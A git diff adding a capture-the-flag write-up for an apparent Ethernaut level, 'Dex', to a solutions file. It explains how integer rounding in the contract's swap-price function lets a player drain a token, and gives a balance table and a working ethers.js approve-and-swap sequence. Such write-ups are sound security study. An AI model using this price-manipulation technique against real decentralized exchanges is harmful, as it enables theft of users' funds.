@@ -24,6 +24,7 @@
 19. [Alien Codex](#19---alien-codex)
 20. [Denial](#20---denial)
 21. [Shop](#21---shop)
+22. [Dex](#22---dex)
     
 ## 01 - Fallback
 
@@ -683,3 +684,57 @@ contract ShopAttack {
 }
 ```
 [Attack Contract](./contracts/Shop.sol) | [Test script](./test/Shop.test.js)
+
+## 22 - Dex
+
+To beat this level we need to drain one of the tokens(`token1` - `token2`) from the Dex contract.<br />
+After inspecting the contract's code, we notice that the method `getSwapPrice` determines the exchange rate between tokens in the Dex
+```solidity
+function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+   return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+}
+```
+**The division won't always calculate a perfect integer**, but a fraction. And in Solidity, there's no fraction, instead the division rounds toward zero(example: 3/2 = 1). Hence, the vulnerability originates from this method.<br>
+
+To drain one of the tokens, we will swap all of our `token1` to `token2`, then swap all of our `token2` to `token1`, and so on.
+Here's the balance & price history 
+|        | Contract |        | Player |
+|--------|----------|--------|--------|
+| Token1 | Token2   | Token1 | Token2 |
+| 100    | 100      | 10     | 10     |
+| 110    | 90       | 0      | 20     |
+| 86     | 110      | 24     | 0      |
+| 110    | 80       | 0      | 30     |
+| 69     | 110      | 41     | 0      |
+| 110    | 45       | 0      | 65     |
+| 0      | 90       | 110    | 20     |
+
+For the last swap, from token2 to token1, and after a simple math equation, swapping `45` tokens of `token2` is enough to drain all the `110` tokens of `token1`.
+
+Here are the swap transactions using `ethers.js`:
+First, we need to call the `approve` function to allow the contract to transfer all of our tokens with an enough allowance, so we don't have to approve again on each transaction:
+```javascript
+tx = await dex.approve(dex.address, 400)
+await tx.wait()
+```
+```javascript
+tx = await dex.swap(token1.address, token2.address, 10)
+await tx.wait()
+
+tx = await dex.swap(token2.address, token1.address, 20)
+await tx.wait()
+
+tx = await dex.swap(token1.address, token2.address, 24)
+await tx.wait()
+
+tx = await dex.swap(token2.address, token1.address, 30)
+await tx.wait()
+
+tx = await dex.swap(token1.address, token2.address, 41)
+await tx.wait()
+
+tx = await dex.swap(token2.address, token1.address, 45)
+await tx.wait()
+```
+
+[Test script](./test/Dex.test.js)
